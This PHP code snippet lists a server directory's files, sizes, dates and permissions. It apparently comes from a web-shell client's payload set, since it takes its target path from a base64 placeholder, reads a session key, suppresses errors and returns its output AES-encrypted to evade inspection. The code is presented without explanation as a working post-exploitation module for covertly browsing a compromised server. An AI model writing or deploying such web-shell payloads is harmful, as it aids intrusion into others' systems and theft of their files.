
function getSafeStr($str)
{
    $s1 = iconv('utf-8', 'gbk//IGNORE', $str);
    $s0 = iconv('gbk', 'utf-8//IGNORE', $s1);
    return ($s0 == $str) ? $s0 : iconv('gbk', 'utf-8//IGNORE', $str);
}
function getPerms($path)
{
    $perms = fileperms($path);
    if (($perms & 0xC000) == 0xC000) {
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        $info = 'p';
    } else {
        $info = 'u';
    }
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));

    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));

    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}

function listFile($dir)
{
    $result = array();
    $allFiles = scandir($dir);
    foreach ($allFiles as $file) {
        if ($file != "." && $file != "..") {
            $tmpResult = array();
            $path = $dir . $file;
            $tmpResult["name"] = getSafeStr($file);
            $tmpResult["type"] = is_dir($path) ? "dir" : "file";
            $tmpResult["size"] = ceil(filesize($path) / 1024);
            $tmpResult["mtime"] = date("Y-m-d H:i:s", filemtime($path));
            $tmpResult["perms"] = getPerms($path);

            array_push($result, $tmpResult);
        }
    }

    return $result;
}

error_reporting(0);
$key = $_SESSION['key'];
session_write_close();
$dir = base64_decode('__DIR__');
$data = array(
    "dir" => $dir,
    "status" => is_readable($dir),
    "files" => listFile($dir)
);
echo openssl_encrypt(base64_encode(json_encode($data)), "aes-256-ecb", $key);
